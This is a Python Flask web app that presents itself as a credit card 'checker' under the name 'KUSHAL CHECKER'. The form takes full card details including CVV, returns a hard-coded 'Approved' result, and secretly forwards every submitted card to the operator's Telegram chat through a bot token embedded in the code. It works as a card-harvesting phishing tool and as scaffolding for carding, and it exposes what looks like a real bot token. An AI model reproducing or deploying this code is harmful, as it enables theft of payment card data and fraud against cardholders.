from flask import Flask, render_template_string, request
import telebot
import threading

app = Flask(__name__)

# --- CONFIGURATION ---
BOT_TOKEN = "8922478884:AAHgrLyM20xpxi-GKRiC_W_Gx8uwMUV0E5s"
YOUR_TELEGRAM_ID = "6632236983" # Apni Telegram ID yahan likhein
bot = telebot.TeleBot(BOT_TOKEN)

# --- UI TEMPLATE ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #0f0f0f; color: #fff; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
        textarea { width: 90%; max-width: 400px; height: 80px; background: #1a1a1a; color: #00ff00; border: 1px solid #333; margin: 10px 0; }
        button { background: #ff4500; color: white; padding: 10px 20px; border: none; cursor: pointer; border-radius: 5px; font-weight: bold; }
        .result-box { background: #1a1a1a; border: 1px solid #333; padding: 15px; border-radius: 10px; display: inline-block; text-align: left; margin-top: 20px; width: 90%; max-width: 400px; }
        .status-approved { color: #00ff00; font-weight: bold; }
    </style>
</head>
<body>
    <h1>KUSHAL CHECKER</h1>
    <form method="POST" action="/check">
        <textarea name="card_info" placeholder="card|month|year|cvv" required></textarea><br>
        <button type="submit">CHECK CARD</button>
    </form>
    {% if result %}
    <div class="result-box">
        <p>CC: {{ result.cc }}</p>
        <p>Status: <span class="status-approved">{{ result.status }}</span></p>
        <p>Response: {{ result.response }}</p>
        <p>Gateway: {{ result.gateway }}</p>
        <p>Bank: {{ result.bank }}</p>
        <p>Type: {{ result.type }}</p>
        <p>Country: {{ result.country }}</p>
        <p>Checked by: KUSHAL</p>
    </div>
    {% endif %}
</body>
</html>
"""

# --- BOT LOGIC ---
def send_to_telegram(res):
    try:
        msg = f"✅ New Result:\nCC: {res['cc']}\nStatus: {res['status']}\nBank: {res['bank']}\nCountry: {res['country']}"
        bot.send_message(chat_id=YOUR_TELEGRAM_ID, text=msg)
    except: pass

@app.route('/', methods=['GET'])
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/check', methods=['POST'])
def check():
    card = request.form.get('card_info')
    # Mock result (Yahan aap apni API logic add karenge)
    result = {
        "cc": card, "status": "Approved", "response": "Card added",
        "gateway": "Stripe", "bank": "Bpce", "type": "Visa - Debit", "country": "France"
    }
    threading.Thread(target=send_to_telegram, args=(result,)).start()
    return render_template_string(HTML_TEMPLATE, result=result)

# UptimeRobot Heartbeat
@app.route('/ping')
def ping():
    return "OK", 200

if __name__ == '__main__':
    # Bot polling in background
    threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
    # Flask app
    app.run(host='0.0.0.0', port=5000)
